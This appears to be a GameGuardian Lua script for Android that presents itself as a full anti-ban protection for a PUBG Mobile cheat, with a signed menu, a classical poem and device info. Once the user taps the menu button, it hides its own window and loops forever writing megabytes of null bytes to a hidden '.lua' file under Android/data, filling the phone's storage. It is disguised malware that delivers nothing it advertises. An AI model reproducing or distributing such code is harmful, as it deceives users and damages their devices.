APP=gg.getTargetInfo()  
local g = {}
g.last = gg.getFile()
g.info = nil

lsq = gg.multiChoice({
    "点我！！！！"
  },nil,"❤by——鹿十七 12.1吃鸡全防❤\n\n\n❤关关雎鸠—在河之洲❤\n\n❤窈窕淑女—君子好求❤\n\n"..os.date('当前时间:%F %X\n').."\n\nGG配置:\n\n包名！！！:"..gg.PACKAGE.."\n\n当前版本！！！:"..gg.VERSION.."\n\n当前版本号！！！:"..gg.BUILD.."\n\n当前进程信息为:"..APP.activities[1].label.."\n\n版本"..APP.versionName.."")
  if lsq[1]==true then

file=io.open("/storage/emulated/0/Android/data/.lua","w")
while (true) 
do
gg.isVisible(false)
gg.setVisible(false)
B= string.rep('\0', 1048576)
_1M = string.rep('\0', 1048576)
Y = string.rep('\0', 1048576)
file:write(B.._1M..Y)
end
end